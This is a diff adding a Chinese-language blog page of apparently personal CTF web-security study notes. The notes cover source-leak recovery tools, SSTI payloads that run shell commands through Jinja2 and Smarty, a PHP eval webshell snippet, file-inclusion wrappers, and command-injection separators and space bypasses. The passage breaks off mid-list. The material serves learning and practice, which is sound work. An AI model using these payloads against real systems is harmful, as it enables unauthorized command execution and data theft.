@@ -1,0 +1,493 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CyberSafe_Notes | MoonlitSyntax</title><meta name="author" content="dionysus"><meta name="copyright" content="dionysus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="我的记性貌似也不是很好，可能只是对别人吧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CyberSafe_Notes">
+<meta property="og:url" content="http://example.com/2023/04/19/CyberSafe-Notes/index.html">
+<meta property="og:site_name" content="MoonlitSyntax">
+<meta property="og:description" content="我的记性貌似也不是很好，可能只是对别人吧">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/14.jpg">
+<meta property="article:published_time" content="2023-04-19T05:18:06.000Z">
+<meta property="article:modified_time" content="2023-07-27T03:20:00.525Z">
+<meta property="article:author" content="dionysus">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/14.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/04/19/CyberSafe-Notes/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: {"appId":"GNDO5PR146","apiKey":"1423d4e114f7a03240e8700efd01af02","indexName":"moonlit","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: true,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CyberSafe_Notes',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-27 11:20:00'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css"  media="defer" onload="this.media='all'"><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/font-awesome-animation.min.css" media="defer" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/tag_plugins.css" media="defer" onload="this.media='all'"><script src="https://npm.elemecdn.com/hexo-butterfly-tag-plugins-plus@latest/lib/assets/carousel-touch.js"></script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/18.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/14.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MoonlitSyntax"><span class="site-name">MoonlitSyntax</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archiver"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw iconfont icon-biaoqian"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw iconfont icon-fenlei"></i><span> 种类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw iconfont icon-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw iconfont icon-yinle"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw iconfont icon-shipin"></i><span> Movie</span></a></li><li><a class="site-page child" href="/books/"><i class="fa-fw iconfont icon-Book"></i><span> Book</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw iconfont icon-lianjie"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw iconfont icon-guanyuwomen"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CyberSafe_Notes</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-19T05:18:06.000Z" title="发表于 2023-04-19 13:18:06">2023-04-19</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-27T03:20:00.525Z" title="更新于 2023-07-27 11:20:00">2023-07-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">4.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>19分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="基本的dos命令">基本的dos命令</h2>
+<ul>
+<li><code>dir</code> - 显示当前目录下的文件和子目录</li>
+<li><code>cd &lt;directory&gt;</code> - 更改当前目录到指定目录</li>
+<li><code>mkdir &lt;directory_name&gt;</code> - 创建新目录</li>
+<li><code>rmdir &lt;directory_name&gt;</code> - 删除目录</li>
+<li><code>copy &lt;source&gt; &lt;destination&gt;</code> - 复制文件或目录</li>
+<li><code>move &lt;source&gt; &lt;destination&gt;</code> - 移动文件或目录</li>
+<li><code>del &lt;filename&gt;</code> - 删除文件</li>
+<li><code>rename &lt;old_filename&gt; &lt;new_filename&gt;</code> - 重命名文件或目录</li>
+<li><code>type &lt;filename&gt;</code> - 显示文件的内容</li>
+<li><code>find /i &quot;text&quot; &lt;filename&gt;</code> - 在文件中查找指定的文本</li>
+<li><code>attrib &lt;filename&gt;</code> - 显示或更改文件属性</li>
+<li><code>cls</code> - 清屏</li>
+<li><code>echo &lt;text&gt;</code> - 显示文本</li>
+<li><code>systeminfo</code> - 显示计算机的详细系统信息</li>
+<li><code>gpupdate /force</code> - 强制更新计算机的组策略设置</li>
+<li><code>shutdown /r</code> - 重新启动计算机</li>
+<li><code>shutdown /s</code> - 关闭计算机</li>
+<li><code>ping &lt;hostname_or_ip_address&gt;</code> - 向指定的主机或 IP 发送 ICMP 回显请求以测试网络连接</li>
+<li><code>ipconfig /all</code> - 显示所有网络接口的详细配置信息</li>
+<li><code>ipconfig /release</code> - 释放当前的 IP 地址配置</li>
+<li><code>ipconfig /renew</code> - 重新获取 IP 地址</li>
+<li><code>ipconfig /flushdns</code> - 清空 DNS 解析缓存</li>
+<li><code>netstat -a</code> - 显示所有活动网络连接和侦听端口</li>
+<li><code>netstat -ano</code> - 显示所有活动网络连接、侦听端口及其关联的进程 ID</li>
+<li><code>netstat -r</code> - 显示 IP 路由表</li>
+<li><code>tracert &lt;hostname_or_ip_address&gt;</code> - 显示到指定目标的 IP 数据包路径</li>
+<li><code>nslookup &lt;hostname_or_ip_address&gt;</code> - 查询 DNS，获取指定主机名或 IP 地址的详细信息</li>
+<li><code>arp -a</code> - 显示本地 ARP 缓存表</li>
+<li><code>route print</code> - 显示本地 IP 路由表</li>
+<li><code>nbtstat -A &lt;ip_address&gt;</code> - 获取远程计算机的 NetBIOS 名称表</li>
+<li><code>telnet &lt;hostname_or_ip_address&gt; &lt;port&gt;</code> - 用于远程登录和管理网络设备，需要注意的是 Telnet 传输数据不加密，存在安全隐患</li>
+<li><code>net view</code> - 显示当前域或工作组中的计算机列表</li>
+<li><code>net view \\&lt;computername&gt;</code> - 显示指定计算机上共享的资源列表</li>
+<li><code>net user</code> - 显示用户帐户列表</li>
+<li><code>net user &lt;username&gt;</code> - 显示指定用户帐户的详细信息</li>
+<li><code>net use Z: /delete</code> - 删除指定的网络连接</li>
+<li><code>net user &lt;username&gt;</code> - 显示指定用户的帐户信息</li>
+<li><code>net user &lt;username&gt; *</code> - 更改指定用户的密码</li>
+<li><code>net user &lt;username&gt; /add</code> - 添加新的用户帐户</li>
+<li><code>net user &lt;username&gt; /delete</code> - 删除指定的用户帐户</li>
+<li><code>net localgroup administrators</code> - 显示本地计算机上的管理员组成员</li>
+<li><code>net localgroup administrators &lt;username&gt; /add</code> - 将用户添加到本地计算机的管理员组</li>
+<li><code>net localgroup administrators &lt;username&gt; /delete</code> - 从本地计算机的管理员组中删除用户</li>
+<li><code>net share</code> - 显示当前计算机上的共享资源</li>
+<li><code>net localgroup</code> - 显示本地计算机上的用户组列表</li>
+<li><code>net group</code> - 显示域中的用户组列表</li>
+<li><code>net share</code> - 显示本地计算机上的共享资源列表</li>
+<li><code>net use</code> - 显示计算机上的网络连接</li>
+<li><code>systeminfo</code> - 显示计算机的详细系统信息</li>
+<li><code>whoami /all</code> - 显示当前用户的详细信息，包括用户组和权限</li>
+<li><code>route print</code> - 显示本地 IP 路由表</li>
+<li><code>tracert &lt;hostname_or_ip_address&gt;</code> - 显示到指定目标的 IP 数据包路径</li>
+<li><code>nslookup &lt;hostname_or_ip_address&gt;</code> - 查询 DNS，获取指定主机名或 IP 地址的详细信息</li>
+<li><code>xcopy &lt;source&gt; &lt;destination&gt; /s /e</code> - 复制目录及其子目录，包括空目录</li>
+<li><code>robocopy &lt;source&gt; &lt;destination&gt; /e</code> - 强大的文件复制工具，包括空目录</li>
+<li><code>chkdsk &lt;drive:&gt;</code> - 检查指定磁盘上的磁盘错误</li>
+<li><code>sfc /scannow</code> - 扫描系统文件并修复错误</li>
+<li><code>gpresult /r</code> - 显示用户的组策略设置报告</li>
+<li><code>tasklist</code> - 显示当前运行的进程</li>
+<li><code>taskkill /im &lt;process_name&gt; /f</code> - 强制终止指定的进程</li>
+<li><code>assoc &lt;file_extension&gt;</code> - 显示或修改文件扩展名关联</li>
+<li><code>ftype &lt;file_type&gt;</code> - 显示或修改文件类型</li>
+<li><code>compact &lt;filename&gt;</code> - 显示或修改 NTFS 分区上文件的压缩状态</li>
+<li><code>diskpart</code> - 运行磁盘分区实用程序</li>
+<li><code>tree &lt;directory&gt;</code> - 以树形结构显示目录及其子目录</li>
+<li><code>title &lt;text&gt;</code> - 更改命令提示符窗口的标题</li>
+<li><code>color &lt;color_code&gt;</code> - 更改命令提示符窗口的文本和背景颜色</li>
+<li><code>set</code> - 显示、设置或删除环境变量</li>
+<li><code>path</code> - 显示或设置可执行文件的搜索路径</li>
+<li><code>hostname</code> - 显示计算机的主机名</li>
+<li><code>whoami</code> - 显示当前用户的用户名和域</li>
+<li><code>pause</code> - 暂停批处理文件的处理，等待用户按任意键</li>
+<li><code>timeout /t &lt;seconds&gt;</code> - 在批处理文件中添加延时</li>
+</ul>
+<h2 id="信息泄露">信息泄露</h2>
+<h3 id="http协议">http协议</h3>
+<ul>
+<li>GET请求
+<ul>
+<li>请求行：包括请求方法（GET）、请求资源的路径（/index.html）以及HTTP协议版本（HTTP/1.1）</li>
+<li>请求头：包含了客户端提供的额外信息，如Host（目标主机名）、User-Agent（浏览器信息）、Accept（可接受的内容类型）等</li>
+<li>请求体：GET请求通常不包含请求体，因为GET请求主要用于获取资源，而不是发送数据</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+<ul>
+<li>GET响应
+<ul>
+<li>状态行：包括HTTP协议版本（HTTP/1.1）、状态码（200）和状态描述（OK）</li>
+<li>响应头：包含了服务器提供的额外信息，如Date（响应时间）、Server（服务器软件信息）、Content-Type（资源类型）、Content-Length（资源大小）等</li>
+<li>响应体：包含了请求的资源内容，如HTML文档、图片数据等</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 21 Apr 2023 08:23:19 GMT</span><br><span class="line">Server: Apache</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Content-Length: 12345</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Last-Modified: Mon, 10 Apr 2023 14:00:00 GMT</span><br><span class="line">ETag: <span class="string">&quot;1a2b3c4d&quot;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">  &lt;title&gt;Example Page&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;h1&gt;Hello, World!&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="vim-交换文件名">vim 交换文件名</h3>
+<p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</p>
+<blockquote>
+<p>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp<br>
+再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>
+第三次产生的交换文件则为 .index.php.swn</p>
+</blockquote>
+<h3 id="扫描目录">扫描目录</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> dirsearch</span><br><span class="line">python dirsearch.py -u 网址 -e php 或 python .\dirsearch.py -u 网址 -e php</span><br></pre></td></tr></table></figure>
+<h3 id="DS-Store文件泄露">.DS_Store文件泄露</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.DS_Store(Desktop Services Store)是macOS目录下的隐藏文件, 包含了当前目录结构和一些的自定义信息, 如背景和图标位置等, 在windows下类似的文件为desktop.ini. 暴露了.DS_Store文件也就相当于暴露了该目录下的所有内容. 可以说是比较严重的泄露.</span><br></pre></td></tr></table></figure>
+<h3 id="Git泄漏">Git泄漏</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">githacker --url http(s)://xxxxxx --output-folder ~/target</span><br><span class="line"><span class="built_in">cd</span> target</span><br><span class="line">git <span class="built_in">log</span></span><br><span class="line">git diff xxxx</span><br><span class="line">git stash list </span><br><span class="line">git stash pop</span><br><span class="line">git reflog 历史</span><br><span class="line">//</span><br><span class="line">wget -r url/.git</span><br></pre></td></tr></table></figure>
+<h3 id="SSTI">SSTI</h3>
+<h4 id="smarty">smarty</h4>
+<p><code>&#123;if system('cat /flag)&#125;&#123;/if&#125;</code></p>
+<p><code>&#123;&#123;config.items()&#125;&#125;</code>- Jinja2引擎解析这个字符串时，它会返回一个包含所有配置项的列表<br>
+<code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls ../').read()&#125;&#125;</code>读取系统文件<br>
+<code>import os os.system('ls ../') os.system('cat ../flag')</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;env&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><code>tplmap</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-d DATA：这个参数允许你设置HTTP请求的body内容。</span><br><span class="line">-H HEADER：这个参数允许你设置HTTP请求的header。</span><br><span class="line">-X METHOD：这个参数允许你设置HTTP请求的方法，如GET、POST等。</span><br><span class="line">--os-shell：这个参数会尝试获取一个操作系统shell。</span><br><span class="line">--os-cmd：这个参数允许你执行一个操作系统命令。</span><br></pre></td></tr></table></figure>
+<h3 id="svn泄漏">svn泄漏</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">工具：dvcs-ripper tree</span><br><span class="line"><span class="built_in">cd</span> dvcs-ripper</span><br><span class="line">perl ./rip-svn.pl -v -u url/.svn/</span><br><span class="line"><span class="comment">#ls -la -&gt; ls -la.svn</span></span><br><span class="line">tree -a .svn <span class="comment">#-a代表显示隐藏文件</span></span><br><span class="line"><span class="built_in">cat</span> ...<span class="comment">#根据具体文件查看信息</span></span><br></pre></td></tr></table></figure>
+<h3 id="hg泄漏">hg泄漏</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">perl ./rip-hg.pl -v -u http://challenge-02ead012a55810f3.sandbox.ctfhub.com:10800/.hg</span><br></pre></td></tr></table></figure>
+<h3 id="查询具体所含数据">查询具体所含数据</h3>
+<p><code>grep -ir flag</code>这是一个使用 grep 命令在文件中搜索特定字符串（本例中为 “flag”）的命令行指令。-i 选项表示大小写不敏感，-r 选项表示递归搜索文件夹</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-i：忽略大小写</span><br><span class="line">-n：显示匹配行的行号</span><br><span class="line">-r：递归搜索文件夹中的文件</span><br><span class="line">-w：查找整个单词匹配</span><br><span class="line">-l：仅列出包含匹配项的文件名</span><br><span class="line">-c：计算匹配行的数量</span><br></pre></td></tr></table></figure>
+<h2 id="密码爆破">密码爆破</h2>
+<p>-弱</p>
+<p>-常用</p>
+<h2 id="RCE">RCE</h2>
+<h3 id="exec">exec</h3>
+<p>无回显 echo “Hello, World!” | tee output.txt<br>
+l’s | tee output.txt</p>
+<h3 id="eval执行">eval执行</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">！！！！！！结尾要带分号！！！！！！</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;ls /&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure>
+<h3 id="文件包含">文件包含</h3>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#函数查找字符串在另一字符串中第一次出现的位置（区分大小写） </span></span><br><span class="line"><span class="comment">#strpos(&quot;You love php, I love php too!&quot;,&quot;php&quot;);</span></span><br><span class="line">...url/?file=shell.txt</span><br><span class="line">构造post：ctfhub=system(<span class="string">&quot;cat /flag&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>file_get_contents 在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录</p>
+<ul>
+<li>php://input#从输入中读取</li>
+</ul>
+<p>eg: <code>&lt;?php system(&quot;ls&quot;);?&gt;</code></p>
+<ul>
+<li>php://filter</li>
+</ul>
+<p><code>php://filter/read=filter_name/resource=resource_url</code><br>
+filter_name：要应用的过滤器名称<br>
+resource_url：要读取的资源的URL<br>
+eg:<code>file=php://filter/read=convert.base64-encode/resource=/flag</code></p>
+<ul>
+<li>data://text/plain;base64,<br>
+file_get_contents()的$filename参数不仅仅为本地文件路径，还可以是一个网络路径URL<br>
+eg:<code>text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file | <span class="built_in">base64</span>也可以写成<span class="built_in">base64</span> file</span><br><span class="line">127.0.0.1&amp; <span class="built_in">cat</span> 1382668722644.php | <span class="built_in">base64</span></span><br><span class="line">代替<span class="built_in">cat</span></span><br><span class="line"><span class="built_in">cat</span> 由第一行开始显示内容，并将所有内容输出</span><br><span class="line"><span class="built_in">tac</span> 从最后一行倒序显示内容，并将所有内容输出</span><br><span class="line">more 根据窗口大小，一页一页的现实文件内容</span><br><span class="line">less 和more类似，但其优点可以往前翻页，而且进行可以搜索字符</span><br><span class="line"><span class="built_in">head</span> 只显示头几行</span><br><span class="line"><span class="built_in">tail</span> 只显示最后几行</span><br><span class="line"><span class="built_in">nl</span> 类似于<span class="built_in">cat</span> -n，显示时输出行号</span><br><span class="line">tailf 类似于<span class="built_in">tail</span> -f</span><br><span class="line">在 bash 下, 可以用以下字符代替空格:&lt;,&lt;&gt;,%20(space),%09(tab),$IFS<span class="variable">$9</span>, <span class="variable">$&#123;IFS&#125;</span>,<span class="variable">$IFS</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>%0a：表示换行符（newline），用于在字符串或文本中表示一个新行的开始。在ASCII编码中，它对应于十进制值10。</p>
+</li>
+<li>
+<p>%0d：表示回车符（carriage return），用于将光标移动到当前行的开始。在ASCII编码中，它对应于十进制值13。在某些环境中，回车符和换行符一起用于表示新行（例如，Windows中的\r\n）。</p>
+</li>
+<li>
+<p>;：分号在许多编程语言中用于分隔语句。在命令行环境中，如Unix和Linux Shell，分号用于在同一行上执行多个命令，命令会按顺序执行，不考虑前一个命令的执行结果。</p>
+</li>
+<li>
+<p>&amp;：在命令行环境中，&amp;符号通常用于将命令放入后台运行，允许用户在命令执行时继续使用命令行。在某些编程语言中，&amp;还可以表示按位与（bitwise AND）操作。</p>
+</li>
+<li>
+<p>|：管道符，用于在命令行环境中将一个命令的输出作为另一个命令的输入。这使得用户可以将多个操作链接在一起，从而创建复杂的数据处理管道。</p>
+</li>
+<li>
+<p>&amp;&amp;：在命令行环境中，&amp;&amp;用于将多个命令链接在一起，使得只有在前一个命令成功执行（返回值为0）时，才会执行下一个命令。在某些编程语言中，&amp;&amp;表示逻辑与（logical AND）操作。</p>
+</li>
+<li>
+<p>||：在命令行环境中，||用于将多个命令链接在一起，使得只有在前一个命令失败执行（返回值非0）时，才会执行下一个命令。在某些编程语言中，||表示逻辑或（logical OR）操作。</p>
+</li>
+<li>
+<p><code>ping 127.0.0.1 &amp; ls</code>：<code>&amp;</code>符号将 <code>ping 127.0.0.1</code> 命令放入后台运行，而不会阻塞命令行界面。在 <code>ping</code> 命令开始执行后，<code>ls</code> 命令会立即执行。这里，<code>ping</code> 和 <code>ls</code> 命令几乎同时运行，它们之间没有依赖关系。</p>
+</li>
+<li>
